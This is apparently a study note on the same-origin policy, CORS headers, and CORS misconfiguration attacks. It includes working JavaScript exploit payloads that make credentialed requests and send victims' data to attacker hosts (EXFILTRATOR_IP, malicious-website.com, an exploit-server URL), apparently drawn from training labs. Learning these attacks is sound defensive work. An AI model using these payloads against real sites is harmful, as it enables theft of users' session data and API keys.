# Same-Origin Policy

The same-origin policy is a restrictive cross-origin specification that **limits the ability for a website to interact with resources outside of the source domain**. The same-origin policy was defined many years ago in response to potentially malicious cross-domain interactions, such as one website stealing private data from another. **It generally allows a domain to issue requests to other domains, but not to access the responses.**

> A controlled relaxation of the same-origin policy is possible using **cross-origin resource sharing (CORS)**.

# CORS

Cross-origin resource sharing (CORS) is a browser mechanism which **enables controlled access to resources located outside of a given domain**. It extends and adds flexibility to the same-origin policy (SOP).

While the Same-Origin Policy (SOP) restricts web pages by default to making requests to the same domain, CORS enables servers to declare exceptions to this policy, allowing web pages to request resources from other domains under controlled conditions.

> It's important to note that the server does not block or allow a request based on CORS; instead, it processes the request and includes CORS headers in the response. The browser then interprets these headers and enforces the CORS policy by granting or denying the web page's JavaScript access to the response based on the specified rules.

## Common Scenarios Where CORS Is Applied
CORS is commonly applied in scenarios such as:

- **APIs and Web Services:** When a web application from one domain needs to access an API hosted on a different domain, CORS enables this interaction. For instance, a frontend application at example-client.com might need to fetch data from example-api.com.
- **Content Delivery Networks (CDNs):** Many websites use CDNs to load libraries like jQuery or fonts. CORS enables these resources to be securely shared across different domains.
- **Web Fonts:** For web fonts to be used across different domains, CORS headers must be set, allowing websites to load fonts from a centralized location.
- **Third-Party Plugins/Widgets:** Enabling features like social media buttons or chatbots from external sources on a website.
- **Multi-Domain User Authentication:** Services that offer single sign-on (SSO) or use tokens (like OAuth) to authenticate users across multiple domains rely on CORS to exchange authentication data securely.

## CORS Headers

### Request Headers (Sent by the Browser)

These headers are sent by the browser when making a cross-origin request, especially a "preflight" OPTIONS request.

####  Origin
Indicates the origin (scheme, host, and port) of the document that initiated the cross-origin request. This is always sent for cross-origin requests.

Example: `Origin: https://www.example.com`

#### Access-Control-Request-Method
Used in a "preflight" OPTIONS request to inform the server about the HTTP method that will be used in the actual request (e.g., POST, PUT, DELETE).

Example: `Access-Control-Request-Method: POST`

#### Access-Control-Request-Headers
Used in a "preflight" OPTIONS request to inform the server about the custom (non-CORS-safelisted) headers that will be sent with the actual request.

Example: `Access-Control-Request-Headers: X-Custom-Header, Content-Type`

### Response Headers (Sent by the Server)
These headers are sent by the server in response to either a simple cross-origin request or a preflight OPTIONS request.

#### Access-Control-Allow-Origin
**The most crucial CORS header.** It specifies which origins are permitted to access the resource. The browser compares this value with the Origin header from the request.

Values:
- A specific origin, the most secure: `Access-Control-Allow-Origin: https://www.example.com`
- Wildcard, least secure, allows any origin, cannot be used with credentials: `Access-Control-Allow-Origin: *`
- null, for requests from local files, sandboxed iframes, etc. Generally discouraged for public-facing APIs: `Access-Control-Allow-Origin: null`

#### Access-Control-Allow-Methods
It specifies the HTTP methods (e.g., GET, POST, PUT, DELETE) that are permitted when accessing the resource. It's sent in response to a preflight request.

Example: `Access-Control-Allow-Methods: GET, POST, OPTIONS`

#### Access-Control-Allow-Headers
It specifies which HTTP headers are permitted to be sent by the client in the actual request. It's sent in response to a preflight request.

Values:
- A comma-separated list of allowed headers: `Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With`
- Wildcard, it allows any header: `Access-Control-Allow-Headers: *` 

#### Access-Control-Allow-Credentials
It Indicates whether the server allows credentials (like cookies, HTTP authentication headers, or client-side SSL certificates) to be included in the cross-origin request.

Values:
- true, it allows credentials: `Access-Control-Allow-Credentials: true`
- Absent, by default, credentials are not allowed

> It's important to note that Access-Control-Allow-Origin: * and Access-Control-Allow-Credentials:true cannot be used together due to security restrictions imposed by the CORS specification.

#### Access-Control-Expose-Headers

It specifies which response headers (beyond the CORS-safelisted ones like Cache-Control, Content-Type, Expires, etc.) can be exposed to the client-side JavaScript.

Example: `Access-Control-Expose-Headers: X-Custom-Response-Header, X-Auth-Token`

#### Access-Control-Max-Age
It indicates how long (in seconds) the results of a preflight request can be cached by the browser. This reduces the number of preflight OPTIONS requests.

Example, 24 hours: `Access-Control-Max-Age: 86400`

## CORS Vulnerabilities

### Basic Origin Reflection
It occurs when a server takes the Origin header from the incoming request and directly reflects it back in the Access-Control-Allow-Origin header without proper validation.

**This means that absolutely any domain can access resources from the vulnerable domain.**

### Errors Parsing Origin Headers

Some applications that support access from multiple origins do so by using a whitelist of allowed origins. When a CORS request is received, the supplied origin is compared to the whitelist. If the origin appears on the whitelist then it is reflected in the Access-Control-Allow-Origin header so that access is granted.

Examples:

- An application grants access to all domains ending in `normal-website.com`
  - An attacker might be able to gain access by registering the domain: `hackersnormal-website.com`
- An application grants access to all domains beginning with `normal-website.com`
  - An attacker might be able to gain access using the domain: `normal-website.com.evil-user.net`


### Whitelisted null Origin Value
The specification for the Origin header supports the value null. 

Browsers might send the value null in the Origin header in various unusual situations:
- **Cross-origin redirects**
- **Requests from serialized data**
- **Request using the `file:// protocol`:** When developers test web applications locally using file:/// URLs (e.g., opening an HTML file directly in a browser without a server), the browser typically sets the origin to "null". In such cases, developers might temporarily allow the "null" origin in CORS policies to facilitate testing.
An attacker could craft a phishing email with a link to a malicious HTML file. When the victim opens the file, it can send requests to the vulnerable server, which incorrectly accepts these as coming from a 'null' origin. Servers should be configured to explicitly validate and not trust the 'null' origin unless necessary and understood.
- **Sandboxed cross-origin requests:** Using an `<iframe>` sandbox will generate a null Origin. Web applications using sandboxed iframes (with the sandbox attribute) **might encounter "null" origins if the iframe's content comes from a different domain**. The "null" origin is a security measure in highly restricted environments.

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
	….
</script>"></iframe>
```

```html
<div style="margin: 10px 20px 20px; word-wrap: break-word; text-align: center;">
   <iframe id="exploitFrame" style="display:none;"></iframe>
   <textarea id="load" style="width: 1183px; height: 305px;"></textarea>
 </div>


 <script>
   // JavaScript code for the exploit, adapted for inclusion in a data URL
   var exploitCode = `
     <script>
       function exploit() {
         var xhttp = new XMLHttpRequest();
         xhttp.open("GET", "http://corssop.thm/null.php", true);
         xhttp.withCredentials = true;
         xhttp.onreadystatechange = function() {
           if (this.readyState == 4 && this.status == 200) {
             // Assuming you want to exfiltrate data to a controlled server
             var exfiltrate = function(data) {
               var xhr = new XMLHttpRequest();
               xhr.open("POST", "http://EXFILTRATOR_IP/receiver.php", true);
               xhr.withCredentials = true;
               var body = data;
               var aBody = new Uint8Array(body.length);
               for (var i = 0; i < aBody.length; i++)
                 aBody[i] = body.charCodeAt(i);
               xhr.send(new Blob([aBody]));
             };
             exfiltrate(this.responseText);
           }
         };
         xhttp.send();
       }
       exploit();
     <\/script>
   `;


   // Encode the exploit code for use in a data URL
   var encodedExploit = btoa(exploitCode);


   // Set the iframe's src to the data URL containing the exploit
   document.getElementById('exploitFrame').src = 'data:text/html;base64,' + encodedExploit;
 </script>
```


### Access-Control-Allow-Credentials: true 
This header allows browsers to send cookies and HTTP authentication credentials with cross-origin requests

Exploit:
```javascript
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
    	location='//malicious-website.com/log?key='+this.responseText;
    };
</script>
```

## Exploitation

### Exploiting XSS via CORS trust relationships

Even "correctly" configured CORS establishes a trust relationship between two origins. If a website trusts an origin that is vulnerable to cross-site scripting (XSS), then an attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application.
Given the following request:

```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
```

If the server responds with:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

Then an attacker who finds an XSS vulnerability on subdomain.vulnerable-website.com could use that to retrieve the API key, using a URL like:

```
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
```

### Breaking TLS with poorly configured CORS

Suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP. 

For example, when the application receives the following request:

```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
```

The application responds with:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

Example:

```javascript
<script>
   document.location="http://stock.0aae00e1033a29c3800e0dd8009c0083.web-security-academy.net/?productId=
   <script>
       var xhr = new XMLHttpRequest();
       xhr.onreadystatechange = function(){
           if (xhr.readyState == XMLHttpRequest.DONE) {
               fetch('https://exploit-0a7500870341291680200c5d01fd0086.exploit-server.net?key=' %2b xhr.responseText)
           };
       };
       xhr.open('GET', 'https://0aae00e1033a29c3800e0dd8009c0083.web-security-academy.net/accountDetails', true);
       xhr.withCredentials = true;
       xhr.send(null);
      
   %3c/script>&storeId=1"
</script>
```

> Most CORS attacks rely on the presence of the response header: **Access-Control-Allow-Credentials: true**.  
Without that header, the victim user's browser will refuse to send their cookies, meaning the attacker will only gain access to unauthenticated content, which they could just as easily access by browsing directly to the target website.